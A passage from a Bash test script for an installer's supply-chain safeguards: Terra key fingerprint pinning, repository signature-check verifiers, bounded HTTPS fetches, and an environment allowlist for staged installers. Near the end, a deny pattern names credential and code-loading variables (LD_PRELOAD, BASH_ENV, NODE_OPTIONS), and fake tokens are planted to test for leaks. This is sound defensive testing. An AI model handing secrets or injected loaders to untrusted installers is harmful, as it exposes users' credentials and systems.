  NR > 1 && $1 == "wsl-distribution-catalog" { $3 = "owner-accepted" }
  { print }' "$repo_root/config/live-sources.tsv" >"$live_fixture"
if lint_output="$(LIVE_SOURCE_MANIFEST="$live_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted data with a script decision.\n' >&2
  exit 1
fi
assert_contains "$lint_output" "wsl-distribution-catalog pairs executes='data' with decision='owner-accepted'"
printf 'PASS: data and executed scripts carry the decisions that fit them\n'

# The generated inventory says what is checked before use, and never counts a
# digest recorded after a script ran.
inventory="$repo_root/docs/supply-chain-sources.md"
assert_file_contains "$inventory" '| Checked before use |'
assert_file_contains "$inventory" '## Accepted live sources'
# Read into variables first: a quiet grep at the end of a pipe exits at its
# first match and can fail the producer under pipefail.
accepted_section="$(sed -n '/^## Accepted live sources/,/^## /p' "$inventory")"
while IFS=$'\t' read -r source_id _; do
  [[ "$source_id" != id ]] || continue
  [[ "$accepted_section" == *"| \`$source_id\` |"* ]] ||
    _test_die "the generated inventory does not list the live decision for $source_id"
done <"$repo_root/config/live-sources.tsv"
tls_rows="$(grep -E '^\| `[a-z0-9-]+` \|.*`https-tls`' "$inventory" || true)"
if [[ "$tls_rows" == *"| yes:"* ]]; then
  _test_die 'the generated inventory claims a TLS-only source is checked before use'
fi
printf 'PASS: the generated inventory shows what is authenticated before use and each accepted live source\n'

# --- A digest pin the consumer does not use is not a pin -------------------
#
# The Parrot boundary image was registered with its tag while the workflow
# pulled `parrotsec/core:latest`, so the registry's claim and the job's
# behaviour could drift without anything noticing. A recorded digest now has
# to be the reference the consumer actually names.
awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "parrot-boundary-image" {
    $9 = "sha256:" sprintf("%064d", 0)
  }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a digest no consumer pulls.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'is recorded as image-digest-pinned'
assert_contains "$lint_output" '.github/workflows/real-install.yml does not name that digest'
printf 'PASS: a recorded image digest must be the one its consumers pull\n'

# --- Terra: no --nogpgcheck, and the key is fingerprint-pinned -------------

# Comments may still explain why the flag is gone; a live invocation may not.
nogpgcheck_uses="$(grep -rn -- '--nogpgcheck' "$repo_root/platforms" \
  "$repo_root/common" "$repo_root/scripts" 2>/dev/null |
  grep -vE ':[[:space:]]*#' || true)"
if [[ -n "$nogpgcheck_uses" ]]; then
  printf 'An installer still passes --nogpgcheck:\n%s\n' "$nogpgcheck_uses" >&2
  exit 1
fi
assert_file_contains "$repo_root/platforms/fedora/lib/fedora.sh" \
  'terra_pinned_fingerprint'
assert_file_contains "$repo_root/platforms/fedora/lib/fedora.sh" \
  '--setopt=terra.gpgcheck=1'
while IFS=$'\t' read -r releasever fingerprint; do
  [[ "$releasever" != \#* && -n "$releasever" ]] || continue
  [[ "$fingerprint" =~ ^[0-9A-F]{40}$ ]] || {
    printf 'Terra key fingerprint for %s is not a 40-character hex value: %s\n' \
      "$releasever" "$fingerprint" >&2
    exit 1
  }
done <"$repo_root/config/terra-keys.tsv"
printf 'PASS: the Terra bootstrap is key-verified and carries no --nogpgcheck\n'

# --- Terra: the fingerprint gate decides whether the key is imported --------

# Behavioural, offline cases. The manifest is a fixture so pinning or retiring a
# real release never changes what these cases prove.
terra_bin="$test_root/terra-bin"
terra_log="$test_root/terra-commands.log"
terra_state="$test_root/terra-state"
terra_manifest="$test_root/terra-keys.tsv"
terra_pinned_fpr=1111111111111111111111111111111111111111
terra_other_fpr=2222222222222222222222222222222222222222
mkdir -p "$terra_bin"
printf '# releasever\tfingerprint\n90\t%s\n' "$terra_pinned_fpr" >"$terra_manifest"

# The RPM keyring is modelled as "fixture-key:<fingerprint>" lines, which is
# what the rpm stub prints as each key's description and the gpg stub turns
# back into colon records.
cat >"$terra_bin/rpm" <<'EOF'
#!/usr/bin/env bash
case "$1 ${2:-}" in
'-q terra-release') [[ -e "$MOCK_STATE/terra-release" ]] ;;
'-q gpg-pubkey')
  [[ -s "$MOCK_STATE/keyring" ]] || {
    printf 'package gpg-pubkey is not installed\n'
    exit 1
  }
  cat "$MOCK_STATE/keyring"
  ;;
'-E %fedora') printf '%s\n' "$MOCK_RELEASEVER" ;;
--import*) printf 'rpm %s\n' "$*" >>"$MOCK_LOG" ;;
*) exit 64 ;;
esac
EOF
cat >"$terra_bin/gpg" <<'EOF'
#!/usr/bin/env bash
[[ "$1 $2" == '--show-keys --with-colons' ]] || exit 64
if (($# == 2)); then
  awk -F: '$1 == "fixture-key" {
    print "pub:-:4096:1:0000000000000000:0:::-:::scESC::::::23::0:"
    print "fpr:::::::::" $2 ":"
  }'
  exit 0
fi
# MOCK_FPR is a space-separated list, so a served key file can carry more than
# one key -- which is the shape the pin has to be able to see.
for fingerprint in $MOCK_FPR; do
  printf 'pub:-:4096:1:0000000000000000:0:::-:::scESC::::::23::0:\n'
  printf 'fpr:::::::::%s:\n' "$fingerprint"
done
EOF
cat >"$terra_bin/curl" <<'EOF'
#!/usr/bin/env bash
while (($#)); do
  case "$1" in
  --output) output="$2"; shift 2 ;;
  *) shift ;;
  esac
done
printf -- '-----BEGIN PGP PUBLIC KEY BLOCK-----\nfixture\n' >"$output"
EOF
cat >"$terra_bin/sudo" <<'EOF'
#!/usr/bin/env bash
printf 'sudo %s\n' "$*" >>"$MOCK_LOG"
exec "$@"
EOF
cat >"$terra_bin/dnf" <<'EOF'
#!/usr/bin/env bash
if [[ "$1" == --dump-repo-config=terra ]]; then
  printf '======== "terra" repository configuration: ========\n'
  printf 'gpgcheck = %s\npkg_gpgcheck = %s\n' "$MOCK_GPGCHECK" "$MOCK_GPGCHECK"
  exit 0
fi
printf 'dnf %s\n' "$*" >>"$MOCK_LOG"
: >"$MOCK_STATE/terra-release"
EOF
chmod +x "$terra_bin"/*

# run_terra <releasever> <served fingerprint> [env assignment ...]
# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
run_terra() {
  local releasever="$1" fingerprint="$2"
  shift 2
  rm -rf -- "$terra_state"
  mkdir -p "$terra_state"
  : >"$terra_log"
  run_capture env PATH="$terra_bin:$PATH" \
    MOCK_LOG="$terra_log" MOCK_STATE="$terra_state" \
    MOCK_RELEASEVER="$releasever" MOCK_FPR="$fingerprint" \
    TERRA_KEY_MANIFEST="$terra_manifest" \
    DOTFILES_FETCH_ATTEMPTS=1 DOTFILES_FETCH_RETRY_DELAY=0 \
    "$@" \
    bash -c '
      set -euo pipefail
      source "$1/common/lib/common.sh"
      source "$1/platforms/fedora/lib/fedora.sh"
      ensure_terra_repository
    ' _ "$repo_root" </dev/null
}

run_terra 90 "$terra_pinned_fpr"
assert_success
assert_contains "$TEST_OUTPUT" "matches the pinned fingerprint $terra_pinned_fpr"
assert_file_contains "$terra_log" 'rpm --import'
assert_file_contains "$terra_log" '--setopt=terra.gpgcheck=1'
assert_eq 'sudo rpm --import' "$(head -n1 "$terra_log" | cut -d' ' -f1-3)" \
  'the pinned key must be imported before terra-release is installed'
printf 'PASS: a key matching the pinned fingerprint is imported before terra-release\n'

run_terra 90 "$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'fingerprint mismatch'
assert_file_empty "$terra_log"
printf 'PASS: a key that does not match the pin is refused before any import\n'

run_terra 91 "$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'Refusing to import an unpinned Terra signing key'
assert_file_empty "$terra_log"
printf 'PASS: an unpinned release is refused without an acknowledgement\n'

run_terra 91 "$terra_other_fpr" TERRA_TRUST_KEY_FINGERPRINT="$terra_other_fpr"
assert_success
assert_contains "$TEST_OUTPUT" "caller's explicit acknowledgement"
assert_file_contains "$terra_log" 'rpm --import'
printf 'PASS: an acknowledged unpinned key is imported\n'

# GAP-25. `rpm --import` trusts every key in the file it is given, so the pin
# has to answer for every key in the file. It used to read the first block and
# stop, which made a file whose first key was Terra's and whose second was
# anyone else's pass the pin, import in full, and verify clean afterwards --
# the post-install check only asks whether the pinned fingerprint is present.
run_terra 90 "$terra_pinned_fpr $terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'carries 2 keys'
assert_contains "$TEST_OUTPUT" "$terra_pinned_fpr"
assert_contains "$TEST_OUTPUT" "$terra_other_fpr"
assert_file_empty "$terra_log"
printf 'PASS: a key file carrying a second key is refused before any import\n'

run_terra 91 "$terra_other_fpr $terra_pinned_fpr" \
  TERRA_TRUST_KEY_FINGERPRINT="$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'carries 2 keys'
assert_file_empty "$terra_log"
printf 'PASS: an acknowledgement does not cover a second key in the same file\n'

# --- Terra: the verifier re-asserts the trust root on every run ------------

# The bootstrap returns early once terra-release is installed, so these cases
# drive the read-only verifier section with the same stubs. MOCK_LOG records
# every sudo, import and install; the verifier must leave it empty.
assert_file_contains "$repo_root/platforms/fedora/scripts/verify.sh" \
  'verify_terra_trust_root'

# run_terra_verify <terra-release installed?> <releasever> <gpgcheck>
#   [keyring fingerprint ...]
# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
run_terra_verify() {
  local installed="$1" releasever="$2" gpgcheck="$3"
  shift 3
  rm -rf -- "$terra_state"
  mkdir -p "$terra_state"
  : >"$terra_log"
  [[ "$installed" != true ]] || : >"$terra_state/terra-release"
  (($# == 0)) || printf 'fixture-key:%s\n' "$@" >"$terra_state/keyring"
  run_capture env PATH="$terra_bin:$PATH" \
    MOCK_LOG="$terra_log" MOCK_STATE="$terra_state" \
    MOCK_RELEASEVER="$releasever" MOCK_GPGCHECK="$gpgcheck" \
    TERRA_KEY_MANIFEST="$terra_manifest" \
    bash -c '
      set -u
      source "$1/common/lib/common.sh"
      source "$1/common/lib/verify.sh"
      source "$1/platforms/fedora/lib/fedora.sh"
      verify_terra_trust_root
      finish_verification "Terra trust root"
    ' _ "$repo_root" </dev/null
}

run_terra_verify true 90 1 "$terra_other_fpr" "$terra_pinned_fpr"
assert_success
assert_contains "$TEST_OUTPUT" 'terra repository enforces package signatures (gpgcheck = 1)'
assert_contains "$TEST_OUTPUT" \
  "Terra signing key for Fedora 90 is in the RPM keyring and matches the pinned fingerprint $terra_pinned_fpr"
assert_file_empty "$terra_log"
printf 'PASS: the verifier accepts gpgcheck = 1 with the pinned key in the keyring, read-only\n'

run_terra_verify true 90 0 "$terra_pinned_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'terra repository has gpgcheck = 0, pkg_gpgcheck = 0, expected 1'
assert_file_empty "$terra_log"
printf 'PASS: the verifier fails a terra repository with gpgcheck = 0\n'

run_terra_verify true 90 1 "$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" \
  "The pinned Terra signing key for Fedora 90 ($terra_pinned_fpr) is not in the RPM keyring"
run_terra_verify true 90 1
assert_failure
assert_contains "$TEST_OUTPUT" "($terra_pinned_fpr) is not in the RPM keyring"
assert_file_empty "$terra_log"
printf 'PASS: the verifier fails when the pinned Terra key is missing from the keyring\n'

run_terra_verify true 91 1 "$terra_other_fpr"
assert_success
assert_contains "$TEST_OUTPUT" 'No pinned Terra signing key for Fedora 91'
assert_contains "$TEST_OUTPUT" 'passed with warnings'
printf 'PASS: the verifier warns, like the installer, for an unpinned Fedora release\n'

run_terra_verify false 90 1 "$terra_pinned_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'terra-release is not installed'
printf 'PASS: the verifier fails when terra-release is not installed\n'

# --- Every repository this installer adds is re-checked after install -------

# SEC-03. Only Terra had a post-install trust-root check. Every bootstrap here
# returns early for good once its repository exists, so a repository shipped
# or later edited with gpgcheck=0 keeps installing root-privileged packages
# unchecked, and the verifier that would have said so covered one of three.

trust_bin="$test_root/trust-bin"
trust_state="$test_root/trust-state"
mkdir -p "$trust_bin"

# A repository DNF knows about is one with a repo-<id> state file holding its
# gpgcheck value; anything else is a repository DNF has never heard of.
cat >"$trust_bin/dnf" <<'EOF'
#!/usr/bin/env bash
if [[ "${1:-}" == --dump-repo-config=* ]]; then
  repo="${1#--dump-repo-config=}"
  [[ -r "$MOCK_STATE/repo-$repo" ]] || exit 1
  value="$(cat "$MOCK_STATE/repo-$repo")"
  printf '======== "%s" repository configuration: ========\n' "$repo"
  printf 'gpgcheck = %s\npkg_gpgcheck = %s\n' "$value" "$value"
  exit 0
fi
printf 'dnf %s\n' "$*" >>"$MOCK_LOG"
EOF
cat >"$trust_bin/rpm" <<'EOF'
#!/usr/bin/env bash
case "${1:-}" in
-q) [[ -e "$MOCK_STATE/pkg-$2" ]] ;;
-ql)
  [[ -e "$MOCK_STATE/pkg-$2" ]] || exit 1
  cat "$MOCK_STATE/pkg-$2"
  ;;
'-E') printf '%s\n' "$MOCK_RELEASEVER" ;;
--import*) printf 'rpm %s\n' "$*" >>"$MOCK_LOG" ;;
*) exit 64 ;;
esac
EOF
cat >"$trust_bin/sudo" <<'EOF'
#!/usr/bin/env bash
printf 'sudo %s\n' "$*" >>"$MOCK_LOG"
exec "$@"
EOF
chmod +x "$trust_bin"/*

trust_log="$test_root/trust-commands.log"

# reset_trust_state: an empty machine, then the caller declares what it has.
reset_trust_state() {
  rm -rf -- "$trust_state"
  mkdir -p "$trust_state"
  : >"$trust_log"
}

# declare_repo <dnf id> <gpgcheck value>
declare_repo() {
  printf '%s\n' "$2" >"$trust_state/repo-$1"
}

# declare_rpm_fusion <variant> <repo id>...: the release package, and the repo
# files it owns, each naming its repositories the way a real one does.
declare_rpm_fusion() {
  local variant="$1" repo_dir="$trust_state/yum.repos.d" id
  shift
  mkdir -p "$repo_dir"
  printf '%s/rpmfusion-%s.repo\n' "$repo_dir" "$variant" \
    >"$trust_state/pkg-rpmfusion-$variant-release"
  : >"$repo_dir/rpmfusion-$variant.repo"
  for id in "$@"; do
    printf '[%s]\nname=RPM Fusion\n\n' "$id" >>"$repo_dir/rpmfusion-$variant.repo"
  done
}

# run_trust <verifier function>: the verifier half, read-only. The cases below
# assert MOCK_LOG stays empty, so a check that reaches for sudo is caught
# rather than trusted.
# shellcheck disable=SC2016 # $1 and $2 are the inner shell's arguments.
run_trust() {
  run_capture env PATH="$trust_bin:$PATH" \
    MOCK_LOG="$trust_log" MOCK_STATE="$trust_state" MOCK_RELEASEVER=90 \
    TERRA_KEY_MANIFEST="$terra_manifest" \
    TAILSCALE_REPO_FILE="$trust_state/tailscale.repo" \
    DNF_REPO_DIR="$trust_state/yum.repos.d" \
    bash -c '
      set -u
      source "$1/common/lib/common.sh"
      source "$1/common/lib/verify.sh"
      source "$1/platforms/fedora/lib/fedora.sh"
      source "$1/platforms/fedora/lib/tailscale.sh"
      "$2"
      finish_verification "Trust roots"
    ' _ "$repo_root" "$1" </dev/null
}

reset_trust_state
run_trust verify_tailscale_trust_root
assert_success
assert_not_contains "$TEST_OUTPUT" 'tailscale repository'
printf 'PASS: the Tailscale trust-root check is silent without the repository\n'

reset_trust_state
: >"$trust_state/tailscale.repo"
declare_repo tailscale 1
run_trust verify_tailscale_trust_root
assert_success
assert_contains "$TEST_OUTPUT" 'tailscale repository enforces package signatures'
assert_file_empty "$trust_log"
printf 'PASS: an installed Tailscale repository is checked, read-only\n'

reset_trust_state
: >"$trust_state/tailscale.repo"
declare_repo tailscale 0
run_trust verify_tailscale_trust_root
assert_failure
assert_contains "$TEST_OUTPUT" 'gpgcheck = 0'
assert_contains "$TEST_OUTPUT" 'Tailscale packages install without signature verification'
printf 'PASS: a Tailscale repository with gpgcheck=0 fails the verifier\n'

reset_trust_state
run_trust verify_rpm_fusion_trust_root
assert_success
assert_contains "$TEST_OUTPUT" 'no RPM Fusion repositories on this machine'
printf 'PASS: absent RPM Fusion repositories are reported, not passed over\n'

reset_trust_state
declare_rpm_fusion free rpmfusion-free rpmfusion-free-updates
declare_rpm_fusion nonfree rpmfusion-nonfree rpmfusion-nonfree-updates
for rpm_fusion_repo in rpmfusion-free rpmfusion-free-updates \
  rpmfusion-nonfree rpmfusion-nonfree-updates; do
  declare_repo "$rpm_fusion_repo" 1
done
run_trust verify_rpm_fusion_trust_root
assert_success
for rpm_fusion_repo in rpmfusion-free rpmfusion-free-updates \
  rpmfusion-nonfree rpmfusion-nonfree-updates; do
  assert_contains "$TEST_OUTPUT" \
    "$rpm_fusion_repo repository enforces package signatures"
done
printf 'PASS: every repository the RPM Fusion release packages own is checked\n'

# The updates repository is where later packages actually come from, so a hole
# there is the one that matters and the one a base-repository-only check would
# have reported clean.
declare_repo rpmfusion-free-updates 0
run_trust verify_rpm_fusion_trust_root
assert_failure
assert_contains "$TEST_OUTPUT" 'rpmfusion-free-updates repository has gpgcheck = 0'
printf 'PASS: gpgcheck=0 in an RPM Fusion updates repository fails the verifier\n'

reset_trust_state
declare_rpm_fusion free rpmfusion-free
declare_repo rpmfusion-free 1
run_trust verify_rpm_fusion_trust_root
assert_failure
assert_contains "$TEST_OUTPUT" 'rpmfusion-nonfree-release is not installed while its sibling is'
printf 'PASS: one RPM Fusion half without the other is reported\n'

# --- RPM Fusion is bootstrapped against keys Fedora itself signed -----------

# The two release RPMs are what install the keys every later RPM Fusion
# package is checked against, so nothing verified them: localpkg_gpgcheck is
# off by default and Fedora's keyring carries no RPM Fusion key. One
# successful interception of mirrors.rpmfusion.org over the install window
# left a permanent, self-consistent trust root behind.
rpm_fusion_keys="$test_root/rpm-fusion-keys"

# run_rpm_fusion_bootstrap: the installer half, with the key directory pointed
# at a fixture so no package has to be installed to exercise it.
# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
run_rpm_fusion_bootstrap() {
  run_capture env PATH="$trust_bin:$PATH" \
    MOCK_LOG="$trust_log" MOCK_STATE="$trust_state" MOCK_RELEASEVER=90 \
    TERRA_KEY_MANIFEST="$terra_manifest" \
    RPM_FUSION_KEY_DIR="$rpm_fusion_keys" \
    bash -c '
      set -uo pipefail
      source "$1/common/lib/common.sh"
      source "$1/platforms/fedora/lib/fedora.sh"
      ensure_rpm_fusion_repositories
    ' _ "$repo_root" </dev/null
}

reset_trust_state
rm -rf -- "$rpm_fusion_keys"
mkdir -p "$rpm_fusion_keys"
: >"$trust_state/pkg-distribution-gpg-keys"
printf 'key\n' >"$rpm_fusion_keys/RPM-GPG-KEY-rpmfusion-free-fedora-90"
printf 'key\n' >"$rpm_fusion_keys/RPM-GPG-KEY-rpmfusion-nonfree-fedora-90"
run_rpm_fusion_bootstrap
assert_success
assert_file_contains "$trust_log" 'RPM-GPG-KEY-rpmfusion-free-fedora-90'
assert_file_contains "$trust_log" 'RPM-GPG-KEY-rpmfusion-nonfree-fedora-90'
assert_file_contains "$trust_log" 'localpkg_gpgcheck=1'
assert_eq 'sudo rpm --import' "$(head -n1 "$trust_log" | cut -d' ' -f1-3)" \
  'the keys must be imported before the release packages are installed'
printf 'PASS: the RPM Fusion release packages are installed against imported keys\n'

reset_trust_state
rm -rf -- "$rpm_fusion_keys"
mkdir -p "$rpm_fusion_keys"
: >"$trust_state/pkg-distribution-gpg-keys"
run_rpm_fusion_bootstrap
assert_failure
assert_contains "$TEST_OUTPUT" 'No reviewed RPM Fusion free signing key for Fedora 90'
assert_file_empty "$trust_log"
printf 'PASS: a missing reviewed key refuses the bootstrap instead of falling back\n'

# --- A repository cannot be added without a verifier ------------------------

# The registry id and the id DNF knows the repository by are not the same
# string, so the pairing is written out; adding a fourth rpm-repo row fails
# here until both halves exist. fedora-os-repos is the one row with no entry:
# it is the distribution's own set, configured by the Fedora installation
# rather than by anything in this repository.
verified_repo_pairs=(terra-repo:terra tailscale-repo:tailscale)
unchecked_repos=''
while IFS= read -r registry_id; do
  [[ -n "$registry_id" && "$registry_id" != fedora-os-repos ]] || continue
  dnf_repo_id=''
  for pair in "${verified_repo_pairs[@]}"; do
    [[ "${pair%%:*}" == "$registry_id" ]] || continue
    dnf_repo_id="${pair#*:}"
  done
  if [[ -z "$dnf_repo_id" ]]; then
    unchecked_repos+="${unchecked_repos:+, }$registry_id (no verifier)"
    continue
  fi
  grep -rqF "verify_repo_trust_root $dnf_repo_id " "$repo_root/platforms" ||
    unchecked_repos+="${unchecked_repos:+, }$registry_id (never verified)"
done < <(awk -F'\t' 'NR > 1 && $4 == "rpm-repo" { print $1 }' \
  "$repo_root/config/network-sources.tsv")
assert_eq '' "$unchecked_repos" \
  'every rpm-repo this installer adds must be re-checked after install'
printf 'PASS: every registered package repository has a post-install check\n'

# --- Bounded fetch behaviour ------------------------------------------------

fetch_bin="$test_root/fetch-bin"
mkdir -p "$fetch_bin"
attempt_log="$test_root/curl-attempts.log"

cat >"$fetch_bin/curl" <<'EOF'
#!/usr/bin/env bash
set -u
printf 'attempt\n' >>"$CURL_ATTEMPT_LOG"
output=""
while (($#)); do
  case "$1" in
  --output) output="${2:-}"; shift 2 ;;
  *) shift ;;
  esac
done
case "${CURL_MODE:-ok}" in
fail) exit 7 ;;
empty) exit 0 ;;
recover)
  if [[ "$(wc -l <"$CURL_ATTEMPT_LOG")" -lt 2 ]]; then
    exit 7
  fi
  printf '#!/bin/sh\ntrue\n' >"$output"
  ;;
*) printf '#!/bin/sh\ntrue\n' >"$output" ;;
esac
EOF
chmod +x "$fetch_bin/curl"

# The bash -c bodies below are single-quoted on purpose: $1/$2 are that
# inner shell's positional arguments, not this script's variables.
# shellcheck disable=SC2016
run_fetch() {
  local mode="$1"
  local destination="$2"
  shift 2
  : >"$attempt_log"
  env PATH="$fetch_bin:$PATH" CURL_MODE="$mode" \
    CURL_ATTEMPT_LOG="$attempt_log" \
    DOTFILES_FETCH_ATTEMPTS=3 DOTFILES_FETCH_RETRY_DELAY=0 \
    "$@" \
    bash -c '
      set -euo pipefail
      source "$1/common/lib/common.sh"
      source "$1/common/lib/fetch.sh"
      fetch_to_file https://example.invalid/payload "$2" "the payload"
    ' _ "$repo_root" "$destination"
}

destination="$test_root/payload"
run_fetch ok "$destination" >/dev/null
assert_path_exists "$destination"
assert_eq 600 "$(stat -c '%a' "$destination")" 'staged file mode'
assert_eq 1 "$(wc -l <"$attempt_log")" 'a successful fetch retried unnecessarily'
printf 'PASS: a successful bounded fetch runs once and stages a mode-0600 file\n'

run_fetch recover "$destination" >/dev/null
assert_path_exists "$destination"
assert_eq 2 "$(wc -l <"$attempt_log")" 'transient recovery attempt count'
printf 'PASS: a transient failure retries within the bounded attempt budget\n'

if fetch_output="$(run_fetch fail "$destination" 2>&1)"; then
  printf 'A permanently failing fetch reported success.\n' >&2
  exit 1
fi
assert_contains "$fetch_output" 'Giving up on the payload after 3 attempt(s)'
assert_eq 3 "$(wc -l <"$attempt_log")" 'permanent failure attempt count'
assert_path_missing "$destination"
printf 'PASS: a permanent fetch failure exits clearly after a bounded budget\n'

if fetch_output="$(run_fetch empty "$destination" 2>&1)"; then
  printf 'An empty download reported success.\n' >&2
  exit 1
fi
assert_contains "$fetch_output" 'Download produced an empty file'
printf 'PASS: an HTTP 200 with an empty body is a failure, not a success\n'

# A non-HTTPS URL is refused before any transfer starts.
# shellcheck disable=SC2016
if fetch_output="$(env PATH="$fetch_bin:$PATH" CURL_ATTEMPT_LOG="$attempt_log" \
  bash -c '
    set -euo pipefail
    source "$1/common/lib/common.sh"
    source "$1/common/lib/fetch.sh"
    fetch_to_file http://example.invalid/payload "$2" "the payload"
  ' _ "$repo_root" "$destination" 2>&1)"; then
  printf 'A plaintext HTTP download was accepted.\n' >&2
  exit 1
fi
assert_contains "$fetch_output" 'Refusing a non-HTTPS download'
printf 'PASS: a non-HTTPS download is refused before any transfer\n'

# Digest and shape checks.
# shellcheck disable=SC2016
shape_target="$test_root/shape"
printf '<html>nope</html>\n' >"$shape_target"
if shape_output="$(bash -c '
  set -euo pipefail
  source "$1/common/lib/common.sh"
  source "$1/common/lib/fetch.sh"
  fetch_assert_shell_script "$2" "the payload"
' _ "$repo_root" "$shape_target" 2>&1)"; then
  printf 'Markup was accepted as a shell script.\n' >&2
  exit 1
fi
assert_contains "$shape_output" 'does not look like a shell script'

printf '#!/bin/sh\ntrue\n' >"$shape_target"
if digest_output="$(bash -c '
  set -euo pipefail
  source "$1/common/lib/common.sh"
  source "$1/common/lib/fetch.sh"
  fetch_verify_sha256 "$2" 0000000000000000000000000000000000000000000000000000000000000000 "the payload"
' _ "$repo_root" "$shape_target" 2>&1)"; then
  printf 'A wrong digest was accepted.\n' >&2
  exit 1
fi
assert_contains "$digest_output" 'SHA-256 mismatch for the payload'
printf 'PASS: wrong-shape and wrong-digest content is rejected\n'

# --- A staged installer inherits only a minimal environment (#504) --------

# Code this repository did not write -- and, for a reviewed-live source, could
# not authenticate before running -- gets the allowlisted names and the inputs
# its call site states, and nothing else the caller happened to export.
installer_probe="$test_root/installer-probe.sh"
printf '#!/bin/sh\nenv | sort >"$PROBE_REPORT_DIR/report"\nexit 7\n' >"$installer_probe"
probe_dir="$test_root/probe"
mkdir -p "$probe_dir"
status=0
env GITHUB_TOKEN=fixture-not-a-credential GH_TOKEN=fixture-not-a-credential \
  ANTHROPIC_API_KEY=fixture-not-an-api-key SSH_AUTH_SOCK=/nonexistent/agent \
  AWS_SECRET_ACCESS_KEY=fixture-not-a-key HTTPS_PROXY=http://proxy.invalid:3128 \
  XDG_RUNTIME_DIR=/run/user/4242 \
  DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/4242/bus \
  bash -c '
  set -euo pipefail
  source "$1/common/lib/common.sh"
  source "$1/common/lib/fetch.sh"
  fetch_run_installer PROBE_REPORT_DIR="$2" MISE_INSTALL_PATH=/tmp/mise -- sh "$3"
' _ "$repo_root" "$probe_dir" "$installer_probe" || status=$?
[[ "$status" == 7 ]] ||
  _test_die "fetch_run_installer did not return the installer's own status (got $status)"
probe_names="$(cut -d= -f1 <"$probe_dir/report" | sort -u | tr '\n' ' ')"
for leaked in GITHUB_TOKEN GH_TOKEN ANTHROPIC_API_KEY SSH_AUTH_SOCK AWS_SECRET_ACCESS_KEY; do
  [[ " $probe_names " != *" $leaked "* ]] ||
    _test_die "a staged installer inherited $leaked"
done
# The user's own service manager, which No Mistakes' installer drives to stop
# and restart its daemon: without these, a rerun on systemd died with "Failed
# to connect to user scope bus" (Fedora WSL, 24 September 2026).
for kept in HOME PATH HTTPS_PROXY MISE_INSTALL_PATH PROBE_REPORT_DIR \
  XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS; do
  [[ " $probe_names " == *" $kept "* ]] ||
    _test_die "a staged installer was not given $kept"
done
# The allowlist, spelled out here and not read from the library. Building the
# expected set by sourcing common/lib/fetch.sh made this check agree with
# whatever the array held, so `LD_PRELOAD NPM_TOKEN` appended to it (and to the
# bootstrap's copy, which is held equal to it below) passed (issue #537,
# V5-23). A change to the array is now a change to this list too, made in the
# same review. In order: the bootstrap's copy is compared in order as well.
expected_installer_environment=(
  HOME USER LOGNAME PATH SHELL TERM LANG LC_ALL LC_CTYPE LC_MESSAGES TMPDIR
  XDG_CONFIG_HOME XDG_DATA_HOME XDG_STATE_HOME XDG_CACHE_HOME
  XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS
  http_proxy https_proxy HTTP_PROXY HTTPS_PROXY no_proxy NO_PROXY
  all_proxy ALL_PROXY SSL_CERT_FILE SSL_CERT_DIR CURL_CA_BUNDLE
)
# And a shape no name may have, whoever updates both lists: a credential by
# its usual name, or a variable that loads code into the process -- the
# dynamic loader's, or the one non-interactive Bash sources before the script,
# since the installer runs as `/bin/bash "$installer"`.
installer_environment_denied='TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|AUTH|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_|^BASH_ENV$|^ENV$'

# installer_environment_problems <fetch.sh>: what is wrong with the array that
# file defines once sourced, one problem per line; nothing when it is right.
installer_environment_problems() {
  local names name
  # shellcheck disable=SC2016 # The inner bash expands these.
  names="$(bash -c 'set -euo pipefail; source "$1"; printf "%s\n" "${DOTFILES_INSTALLER_ENVIRONMENT[@]}"' _ "$1")" || {
    printf '%s did not define DOTFILES_INSTALLER_ENVIRONMENT when sourced\n' "$1"
    return 0
  }
  [[ "$names" == "$(printf '%s\n' "${expected_installer_environment[@]}")" ]] ||
    printf 'DOTFILES_INSTALLER_ENVIRONMENT is not the reviewed list: %s\n' "$(tr '\n' ' ' <<<"$names")"
  for name in $names; do
    [[ ! "$name" =~ $installer_environment_denied ]] ||
      printf 'DOTFILES_INSTALLER_ENVIRONMENT hands a staged installer %s\n' "$name"
  done
}

environment_problems="$(installer_environment_problems "$repo_root/common/lib/fetch.sh")"
[[ -z "$environment_problems" ]] || _test_die "$environment_problems"

# Only allowlisted names, plus what the call site stated, plus whatever the
# shell itself defines on startup: nothing the allowlist does not explain.
allowed=" ${expected_installer_environment[*]} MISE_INSTALL_PATH PROBE_REPORT_DIR PWD SHLVL OLDPWD _ "
for name in $probe_names; do
  [[ "$allowed" == *" $name "* ]] ||
    _test_die "a staged installer inherited a name outside the allowlist: $name"
done
printf 'PASS: a staged installer inherits only the allowlisted environment\n'

# The check has to reject a widened array. NPM_TOKEN is the obvious one; the
# subtle one, NODE_OPTIONS (which can --require code into every node the
# installer starts), has no deny-listed shape and is caught only because the
# expected list is not the library's.
environment_fixtures="$test_root/installer-environment"

# widened_fetch_library <case>: a copy of common/lib/fetch.sh beside the
# common.sh it sources, so the copy runs as the library does; prints its path.
widened_fetch_library() {
  local library="$environment_fixtures/$1/common/lib"
  mkdir -p "$library"
  cp "$repo_root/common/lib/common.sh" "$library/common.sh"
  printf '%s\n' "$library/fetch.sh"
}

for added in NPM_TOKEN 'LD_PRELOAD NPM_TOKEN' NODE_OPTIONS; do
